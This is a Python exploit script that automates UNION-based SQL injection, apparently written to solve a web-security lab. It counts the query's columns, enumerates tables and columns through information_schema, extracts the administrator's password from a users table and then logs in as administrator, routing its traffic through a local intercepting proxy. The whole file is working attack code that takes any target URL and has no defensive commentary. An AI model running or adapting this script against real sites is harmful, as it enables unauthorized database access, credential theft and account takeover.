import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import re


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def sqli_admin_login(username, passwd, url):
    s = requests.Session()
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    myData = {
        'csrf':csrf,
        'username':username,
        'password':passwd
    }
    r2 = s.post(url, data=myData, verify=False, proxies=proxies)
    if "administrator" in r2.text:
        return True
    else:
        return False

def sqli_retrieve_admin_pass(url, numCols, tableName):
    if numCols == 2:
        tableNameQ = "'"+tableName+"'"
        payload = f"' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name={tableNameQ}--"
        r = requests.get(url+payload, verify=False, proxies=proxies)
        res = r.text
        soup = BeautifulSoup(res, 'html.parser')
        usernameCol = soup.find(string=re.compile("username_.*"))
        passwordCol = soup.find(string=re.compile("password_.*"))
        payload2 = f"' UNION SELECT {usernameCol},{passwordCol} FROM {tableName}--"
        r2 = requests.get(url+payload2, verify=False, proxies=proxies)
        res2 = r2.text
        soup2 = BeautifulSoup(res2, 'html.parser')
        # adminUser = soup2.find(string="administrator")
        trs = soup2.find_all('tr')
        for tr in trs:
            th = tr.find('th')
            if th and th.text.strip() == "administrator":
                adminPass = tr.find('td').text.strip()
                return adminPass
    else:
        # do somethin else
        return
    

def getUsersTable(url):
    payload = "' UNION SELECT table_name,NULL FROM information_schema.tables--"
    r = requests.get(url + payload, verify=False, proxies=proxies)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    usersTable = soup.find(string=re.compile("users_.*"))
    if usersTable is not None:
        return usersTable
    else:
        return False


def exploit_sqli(url):
    counter = 1
    payload = "NULL"
    end = "--"
    r = requests.get(url + "' UNION SELECT " + payload + end, verify=False, proxies=proxies)
    while "Internal Server Error" in r.text:
        payload += ",NULL"
        r = requests.get(url+ "' UNION SELECT " + payload + end, verify=False, proxies=proxies)
        counter += 1
    return counter
    

def main():
    if len(sys.argv) != 3:
        print(f"(+) Usage: {sys.argv[0]} <url> <loginUrl>")
        print(f"(+) Example: {sys.argv[0]} https://target.com/ https://target.com/login")
        sys.exit(-1)

    url = sys.argv[1]
    loginUrl = sys.argv[2]
    numCols = exploit_sqli(url)
    print(f'(+) Number of returned columns: {numCols}')

    # Assume we already tested the database version

    usersTable = getUsersTable(url)
    if usersTable:
        adminPassword = sqli_retrieve_admin_pass(url, numCols, usersTable)
        print(adminPassword)
        if sqli_admin_login("administrator", adminPassword, loginUrl):
            print("(+) SQL injection successed and logged in as administrator")
        else:
            print("(-) SQL injection failed")
    else:
        print("(-) Unable to get the users table")
    
    

if __name__ == "__main__":
    main()


    